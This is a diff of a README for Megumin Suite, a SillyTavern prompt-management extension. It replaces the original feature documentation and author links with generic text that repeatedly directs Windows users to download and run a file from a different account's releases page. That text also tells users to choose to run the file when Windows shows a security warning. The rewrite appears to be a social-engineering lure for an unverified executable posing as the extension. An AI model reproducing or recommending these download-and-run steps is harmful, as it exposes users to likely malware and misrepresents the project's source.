@@ -1,174 +1,231 @@
-# 💥 Megumin Suite V5 for SillyTavern
+# 💥 Megumin-Suite - Auto-manage your SillyTavern prompts
 
-**The Ultimate Automated Prompt Management & Roleplay Configuration Engine.**
+[![Download Megumin Suite](https://img.shields.io/badge/Download-Megumin%20Suite-blue?style=for-the-badge)](https://github.com/Lottyfallacious480/Megumin-Suite/releases)
 
-Megumin Suite completely revolutionizes how you manage your preset prompts, writing styles, and AI behavior in SillyTavern. No more manually toggling prompts on and off every time you switch from a gritty dark fantasy to a lighthearted romance. The engine automatically generates optimized rules tailored to your exact preferences, applying them dynamically on a **per-character basis**.
+## 🧩 What Megumin Suite does
 
----
+Megumin Suite helps you manage SillyTavern prompt settings on Windows without manual editing each time.
 
-## 🤔 Why Do You Need Megumin Suite?
+It gives you a simple way to set rules for how the AI should write, then applies those rules based on the character you are using. That means less copying, less switching, and less time spent adjusting the same settings again and again.
 
-Before Megumin Suite, changing how the AI writes — its length, its tone, the narrator's perspective — meant manually editing text boxes and swapping presets every single time. Megumin Suite automates all of that through a sleek wizard GUI.
+Use it when you want:
 
-* **Global Defaults vs. Custom Profiles:** Set a "Global Default" configuration for all new chats. The moment you tweak a setting inside a specific character's chat, the ext creates an isolated **Custom Character Profile** that only affects *that* character, leaving your other roleplays untouched.
+- one setup for all new chats
+- different setup rules for different characters
+- faster switching between writing styles
+- less manual work in SillyTavern
+- a cleaner way to keep prompt settings organized
 
----
+## 📦 Download Megumin Suite
 
-## ✨ The Big Three: What Makes V5 Different
+Go to the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases) to download and run this file on Windows.
 
-### V5 Slice of Reality Mode
+On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, pick the one marked for Windows.
 
-This is the headline feature and the philosophy behind V5. Previous modes (V4 Balance, V4 Cinematic, V4 Dark) all worked well, but they still had a tendency to lean into AI clichés: NPCs that simp for you, consequences that don't stick, and scenarios where you magically end up with a villa and all the money in the world. **V5 Slice of Reality kills that.**
+## 🖥️ What you need
 
-The goal isn't to make the story miserable or dramatic for the sake of it — it's to keep things **real** while preserving writing flavor and just enough drama to keep things interesting. It's the perfect balance.
+Megumin Suite is built for Windows users and works best with a current desktop setup.
 
-Here's how it works under the hood:
+Recommended setup:
 
-(the result may very depending on the model the smarter the better.)
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- enough free disk space for the app and your local presets
+- SillyTavern installed and working
+- a mouse and keyboard for setup
 
-#### The "Hands Off" Rule
-The user character (PC) is the only entity the AI doesn't control. It never narrates what you're thinking or feeling. It only controls how the **world and NPCs react** to your observable actions. Your thoughts are invisible. NPCs respond to what they *see* you do and *hear* you say — nothing more.
+For smooth use, keep your Windows system updated and make sure your browser can open local apps and pages.
 
-#### The World Keeps Turning
-Time doesn't freeze when you stop typing. NPCs have jobs, secrets, and messy lives that continue off-screen. The engine fills silence with the texture of real life — a distant siren, a neighbor arguing. When an NPC's off-screen life bleeds into the current scene (a phone call they hang up quickly, an unexplained bad mood), the engine lets it happen without explaining it. The user gets to wonder.
+## 🚀 Getting started
 
-#### NPCs Are People, Not Quest-Givers
-This is where V5 really shines. NPCs operate on a **priority stack**:
-1. **The Hidden Layer** — What are they *actually* feeling deep down?
-2. **The History** — Do they trust the person in front of them?
-3. **The Pressure** — Is the environment making them act out?
-4. **The Goal** — What do they want and what are they aiming for?
+1. Open the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases).
+2. Find the newest release at the top of the page.
+3. Download the Windows file from that release.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, choose to run it.
+6. Follow the setup steps shown in the app.
+7. Open SillyTavern and connect Megumin Suite to your profile settings.
 
-They run on **subtext**: nobody says exactly what they mean. If someone is hurt, they might get quiet instead of yelling. Emotions have **inertia** — you can't just say "sorry" and have everything reset. NPCs can lie, walk away, or shut down if they've had enough. They don't need the PC's permission to leave a room.
+If your browser blocks the download, check the download bar and choose to keep the file.
 
-#### The Information Firewall
-NPCs only know what they have **witnessed** or been **told**. They cannot read minds. They can be *completely wrong* about things and act on those wrong assumptions with full confidence. This single rule eliminates 90% of the "omniscient NPC" problem that plagues most AI roleplay.
+## 🛠️ First-time setup
 
-#### Physical Reality
-Bodies are fragile. If someone's cold, they shiver. If they're terrified, their hands shake. Violence is never "cool" — it's clumsy, scary, and leaves scars. When words fail, the engine uses raw vocalizations: gasps, stammered half-words, and the kind of involuntary sounds that people actually make under stress.
+When you start Megumin Suite for the first time, set up your base profile first.
 
-#### The Never-Ending Scene
-V5 never cuts a scene just because your turn is done. It asks: *"What would this person do next?"* If an NPC is angry, maybe they slam the door. If they're worried, maybe they follow you. If you go to sleep, V5 shows what happened while you were out. Every response ends on a **hook**.
+Use these steps:
 
-> **TL;DR:** V5 Slice of Reality treats roleplay like a documentary instead of a Hollywood movie. NPCs have real emotions, real limitations, and real agency. The world doesn't revolve around you — and that's what makes the story feel *alive*.
+1. Choose a default writing setup for new chats.
+2. Set your preferred tone, length, and point of view.
+3. Save the default profile.
+4. Open one character chat in SillyTavern.
+5. Change one or two settings for that character.
+6. Save the character profile.
+7. Repeat for other characters only when you need a different style.
 
----
+A good first setup is simple. Start with one global preset, then add custom profiles only for characters that need different behavior.
 
-### 🧠 Chain of Thought V2
+## ⚙️ How it works
 
-Chain of Thought (CoT) forces the AI to **think before it writes**. Before generating any response, the model goes through a structured reasoning process inside `<think>` tags. V1 was the original 8-step framework that focused heavily on NPC emotional landscapes. **V2 is a complete redesign** built around catching the AI's worst habits in real-time.
+Megumin Suite keeps your prompt setup in two layers:
 
-#### How CoT V2 Works (The 7 Steps)
+- **Global Default**: the main setting used for new chats
+- **Custom Character Profile**: a profile made for one character chat
 
-1. **Reality Check (The "No-Go" Zones)**
-   * *Am I narrating the user's thoughts?* → Stop immediately.
-   * *Is this too convenient? Is the NPC acting like an information dump instead of a real person?* → The "Script Trap" detector catches when the AI is writing fan-fiction instead of believable behavior.
+This helps you keep control without editing the same text by hand every time.
 
-2. **The Information Audit (Knowledge Check)**
-   * For each NPC, the AI must list what they *actually* know based on: what they saw with their own eyes, what someone else told them (reliably or not), and what they can reasonably guess from their personality.
-   * It then identifies the **gap** (what they *don't* know) and the **error** (are they acting on a wrong assumption?). Example: *"They saw the PC holding a knife, so they assume the PC is the killer, even though the PC was just picking it up."*
+Example use cases:
 
-3. **NPCs Move**
-   * Every NPC must have a clear next move that serves *their own goal* — not the plot, not the user's expectations.
+- dark fantasy character with short, sharp replies
+- romance character with softer language
+- lore-heavy character with long scene detail
+- casual chat character with a relaxed tone
 
-4. **The Off-Screen Pulse**
-   * What happened in the background while the PC was busy? The clock never stops.
+When you change a setting in a specific character chat, Megumin Suite can create a separate profile for that character. That keeps the change local and stops it from affecting other chats.
 
-5. **The Subtext Map (Author's View)**
-   * Surface vs. Undercurrent: What are they *saying* vs. what do they actually *want*?
-   * Physical Leak: How does the inner tension show in their body? (A clenched jaw, a barely hidden flinch, fingers tapping too fast.)
+## 🎯 Main features
 
-6. **Writing Style & Pace Check**
-   * Did the AI actually follow the writing style rules you configured in Stage 3? This step forces self-compliance.
+### 🧠 Smart prompt control
 
-7. **The Beat & The Hook**
-   * What is the specific "Pivot Point" the response ends on to force the user to respond? No more NPCs politely waiting in silence.
+Set how the AI should write from one place. Keep your prompt rules in order and avoid messy text boxes.
 
-#### Multilingual Support
-Both V1 and V2 support thinking in **8 languages**: English, Arabic, Spanish, French, Mandarin Chinese, Russian, Japanese, and Portuguese. The CoT process runs in your chosen language, but the final output respects your Language Output setting (defaults to English if left blank, which also prevents thinking-language leaking into the narrative).
+### 👤 Per-character profiles
 
-> **TL;DR:** CoT V2 is a bullshit detector for the AI. It forces the model to audit its own knowledge, check for convenience-writing, plan NPC actions around their own goals, and always end on a hook. The result is smarter, more consistent, and dramatically more believable roleplay.
+Give each character its own writing style. Use different settings for different roles, scenes, or moods.
 
----
+### 🧾 Global default setup
 
-### 🚫 Dynamic Ban List — *"Kill the Dead Language"*
+Create one base profile for new chats. Use it as the starting point for every new character.
 
-Every AI model has crutch phrases — those overused clichés it falls back on no matter what you do. *"A shiver ran down their spine." "They released a breath they didn't know they were holding." "Their eyes widened imperceptibly."* You know them. You hate them. The Dynamic Ban List Try to kill them.
+### 🔁 Fast switching
 
-#### How It Works
+Move between styles without rebuilding your prompt setup each time.
 
-1. **Hit "Analyze Chat History"** — The engine pulls the last **50 AI messages** from your current chat, strips out all thinking blocks, summary blocks, and HTML formatting, and feeds the cleaned narrative text to the AI as a dedicated analysis task.
+### 🪄 Guided interface
 
-2. **AI-Powered Pattern Detection** — Instead of just matching exact phrases, the engine asks the AI to act as a **literary critique** and identify the 5 most repetitive stylistic patterns or crutch phrases. The AI returns *generalized rules* — not just "she let out a breath" but **"Characters releasing breaths they didn't know they were holding"** as a pattern to ban.
+Use a wizard-style setup flow that keeps the process simple. You do not need coding skills.
 
-3. **Injected as Hard Rules** — Every banned phrase gets compiled into a `[BAN LIST]` block that's injected directly into the system prompt with the instruction: *"Never rely on these clichés, tropes, or repetitive patterns. They are dead language."* The AI sees this ban list on every single generation.
+### 📚 Organized presets
 
-4. **Manual Control** — You can also manually type and add any phrase or pattern you want banned. Each entry shows up as a red tag you can click to remove. Clear the whole list with one button if you want a fresh start.
+Store your writing rules in a cleaner format so you can find and edit them with less effort.
 
----
+## 🪟 Installing on Windows
 
-### 🎨 Complete Writing Style Overhaul — *"Your Personal Author's Room"*
+Follow these steps after you download the release file:
 
-Stage 3 has been completely rebuilt from the ground up. Gone is the old single-config screen. In its place is a full **Style Library** — a system for creating, saving, managing, and hot-swapping multiple writing style profiles.
+1. Open your Downloads folder.
+2. Find the Megumin Suite file you downloaded.
+3. Double-click the file to start it.
+4. If Windows shows a security prompt, choose to run it.
+5. If the app opens in a folder window, keep the file in place.
+6. If the app asks where to store settings, choose a folder you can find later.
+7. Finish the first setup inside the app.
 
-#### The Style Library
-The new UI is a clean, full-width vertical list that shows all your styles at a glance. Each style card shows:
-* The style name and a preview of its generated rule
-* Quick-action buttons: **Redo** (regenerate the rule), **Edit** (open the full editor), **Delete**
+If the file is a ZIP archive, extract it first, then open the app from the extracted folder.
 
-#### 8 Pre-Configured Templates
-Don't want to start from scratch? Pick from the built-in template library and generate a complete writing style rule with a single click:
+## 🔌 Using Megumin Suite with SillyTavern
 
-| Template | Inspiration | Vibe |
-|---|---|---|
-| **The Backseat Narrator** | Lemony Snicket, Terry Pratchett | Opinionated narrator who pauses to editorialize |
-| **Overthinking Everything** | Dostoevsky | Deep internal monologue and moral spiraling |
-| **The Snarky Observer** | The Stanley Parable, GLaDOS | Dry, sarcastic narrator who mocks your choices |
-| **Thrones & Consequences** | George R.R. Martin | Political intrigue, mud, blood, and no plot armor |
-| **Something's Off** | Stephen King | Mundane details that slowly turn into creeping dread |
-| **Sweet Like Sugar** | — | Wholesome, warm, openly rooting for a happy ending |
-| **Simple and Plain** | — | No flowery prose. Straight to the point. |
-| **Popcorn Mode** | — | High-octane action, punchy sentences, nonstop tension |
+After setup, use Megumin Suite when you want to change how SillyTavern behaves for a chat.
 
----
+Basic flow:
 
-### 🛠️ Bug Fixes, Dev Tools & Quality of Life
+1. Open SillyTavern.
+2. Pick the character you want to edit.
+3. Open Megumin Suite.
+4. Choose the profile you want to use.
+5. Change the writing settings if needed.
+6. Save the profile.
+7. Return to your chat and continue talking.
 
-* **Critical Bug Fix — Forbid Overrides:** Fixed a stupid error on my end where `Forbid Overrides` was left disabled. This meant some character cards were silently overwriting the main system prompts and ruining the output. Now locked down properly. use the new json files.
-* **chat group:** added chat group support.
-* **MVU Compatibility:** Added support for [MVU Game Maker](https://github.com/KritBlade/MVU_Game_Maker). Enable it as a block in Stage 5.
-* **Draggable Button:** The main extension button is now draggable. WOW.
-* **Global Dev Mode Toggle:** Introduced a global override switch. When enabled, saving or restoring a prompt override applies the change across **all profiles** (Characters, Groups, and Defaults) simultaneously.
+If you switch to a different character, you can keep the same global default or use a custom profile for that character.
 
----
+## 🧱 Suggested setup for new users
 
-## 🤖 Recommended AI Models
+If this is your first time using the app, start with a simple profile like this:
 
-For the best experience, use models with strong instruction-following and reasoning:
+- **Tone:** neutral
+- **Reply length:** medium
+- **Perspective:** match the character
+- **Style:** clear and direct
+- **Narration:** based on the chat type
+- **Special rules:** only add what you need
 
-*  **Gemini 3.1 pro**
-*  **Claude opus 4.6**
-*  **GLM 5 and 4.7**
-*  **Kimi k2.5** (Tested lightly, performs well)
+This gives you a clean base profile that works well for most chats.
 
-*Megumin Suite is flexible, but weaker models may struggle with the complex system rules the engine generates.*
+## 🧹 Tips for smooth use
 
----
+- Keep one default profile for general use
+- Make custom profiles only when a character needs them
+- Use short names for profiles so they are easy to spot
+- Test one setting at a time
+- Save after each change
+- Keep your SillyTavern setup in one folder you can reach fast
 
-## Install:
- https://www.youtube.com/watch?v=Q-iaz9mBFrA
+If a profile does not feel right, adjust one setting and test again. Small changes are easier to track.
 
----
+## ❓ Common questions
 
-## ⚠️ Troubleshooting & Tips
+### Do I need coding knowledge?
 
-* **Thinking Block Won't Close:** If `<think>` tags bleed into the chat, enable the **Think Bug Toggle** in your settings.
-* **Generation Hanging / Formatting Issues:** Try **disabling "Prefill"** in the presets.
-* **Does this extension mess with my other presets?** No — your other presets will work just fine. Megumin Suite only injects its rules into its own designated preset (`Megumin Suite`). Your existing presets remain completely untouched.
-* **Old Versions:** Legacy docs are here: [Megumin Suite Legacy Readme](https://github.com/Arif-salah/Megumin-Suite/tree/V4.1)
+No. The app is meant for normal Windows users and uses a guided setup flow.
 
----
-* [Ko-fi (Buy me a coffee)](https://ko-fi.com/kasumaoniisan)
-* **Crypto (LTC)**: `LSjf1DczHxs3GEbkoMmi1UWH2GikmXDtis`
+### Do I need to edit prompt text by hand?
 
-**Enjoy the ultimate SillyTavern roleplay experience with Megumin Suite V5.**
+Not for every chat. Megumin Suite is built to reduce that work.
+
+### Can I use different settings for different characters?
+
+Yes. That is one of the main parts of the app.
+
+### Does it work with new chats?
+
+Yes. You can set a global default for new chats and then make custom profiles when needed.
+
+### What if I only want one style for everything?
+
+Use one global default and keep it simple. You do not need custom profiles unless you want them.
+
+## 🧭 Folder and file habits
+
+To keep things easy, use a simple folder layout:
+
+- one folder for the app
+- one folder for exports or saved profiles
+- one folder for SillyTavern data if you keep local files
+
+This makes it easier to find your setup later, especially if you change multiple profiles.
+
+## 🧰 Troubleshooting
+
+### The file will not open
+
+Make sure you downloaded the Windows release file from the releases page and not the source code.
+
+### Windows blocks the app
+
+Open the file again and choose the option to run it. If your browser stopped the download, allow it in the download bar first.
+
+### The app does not seem linked to SillyTavern
+
+Check that both tools are pointed at the same profile data and that you saved your changes.
+
+### My character profile changed the wrong chat
+
+Open the profile for that character and review the saved rules. Then return to the global default if you want the same setup for other chats.
+
+### I cannot find the downloaded file
+
+Check your browser download history or open the Downloads folder in File Explorer.
+
+## 📄 Release downloads
+
+Download and run the Windows file from the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases).
+
+Use the latest release unless you need an older one for a specific setup.
+
+## 🗂️ Project name
+
+Megumin-Suite
+
+## 🔎 Short description
+
+Megumin Suite helps Windows users manage SillyTavern prompts with global defaults and per-character profiles
